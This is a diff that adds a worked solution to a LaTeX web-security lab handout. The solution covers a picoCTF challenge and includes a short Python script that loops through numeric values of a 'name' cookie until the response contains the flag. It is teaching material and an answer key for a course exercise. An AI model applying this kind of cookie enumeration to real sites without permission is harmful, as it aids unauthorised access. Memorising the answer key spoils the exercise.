@@ -282,3 +282,18 @@ Solve NATAS levels 6-8. To do so, you must first complete levels 1-5 of Lab 1. F
 
 \subsubsection{Task 3 - Request/Responses with Python}
 While Burp is an excellent tool for intercepting requests and responses, Python can be really useful to easily manipulate requests and responses, thus providing similar functionalities to Burp Proxy and Repeater. Find the flag on this page by using Python 3 requests: \url{http://mercury.picoctf.net:27177/}.
+
+\paragraph{Solution.} Trying random words in the search bar doesn't yield anything useful. However, by intercepting a request with Burp, we notice that the server accepts a \NewTexttt{name} cookie, and internally converts its string value into a number. This behavior can be exploited by sending requests with the \NewTexttt{name} cookie set to different numeric values. By iterating through integers, we eventually reach the page containing the flag. In python, this looks like:
+
+\begin{pythoncode}
+import requests
+
+
+URL = "http://mercury.picoctf.net:27177/"
+
+for counter in range(1000):  # Reasonable upper bound
+    r = requests.get(URL, cookies={"name": str(counter)})
+    if "picoCTF{" in r.text:
+        print(f"Flag found with cookie name = {counter}")
+        break
+\end{pythoncode}
